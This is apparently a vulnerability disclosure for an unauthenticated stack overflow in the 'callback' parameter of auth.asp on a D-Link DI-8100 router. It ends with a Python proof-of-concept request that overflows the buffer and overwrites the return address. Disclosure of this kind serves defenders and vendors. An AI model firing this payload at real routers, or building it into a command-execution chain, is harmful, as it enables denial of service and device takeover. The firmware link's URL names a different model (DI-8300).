## Affected version 

DI-8100-16.07.26A1 

## Vulnerability details 

The DI-8100 is D-Link's wireless broadband router designed for small to medium network environments. The jhttpd program has a binary vulnerability that an attacker can exploit without authorization to cause denial of service or command execution.

Firmware download address：[https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8100](https://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8300)



1、In the auth_asp function of the jhttpd file, the callback parameter is controllable, and when both usr and pwd are empty, it will be copied to v65 with sprintf resulting in stack overflow, which can result in denial of service or even command execution



![image-20250320232318721](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232318721.png)

2、The url interface corresponding to the function is auth.asp, and it can be accessed without login (the page authorization logic needs to follow the jhttpd program initialization module for analysis), that is, attackers can exploit the vulnerability without authorization

3、As shown in the figure, through simulation debugging in the virtual machine, it is found that the return address can be successfully overwritten and the jump can be controlled. Theoretically, the command execution effect can be achieved by constructing the rop chain.

![image-20250320232432130](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232432130.png)

verify：

Using the simulated FirmAE tool, tool address: https://github.com/pr0v3rbs/FirmAE

![image-20250320232532558](/Users/fizzl/Library/Application Support/typora-user-images/image-20250320232532558.png)



4、poc

```python
import requests  
 
payload = b'a'*0x816 + b"ABCD"

command_url = f"http://192.168.0.1/auth.asp?callback={payload}"  
command_headers = {  "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",  "Accept-Language": "en-US,en;q=0.5",  "Accept-Encoding": "gzip, deflate, br",  "Connection": "close",  "Upgrade-Insecure-Requests": "1"  
}  
  
response = requests.get(command_url, headers=command_headers)  
 
print(response.text)  
```

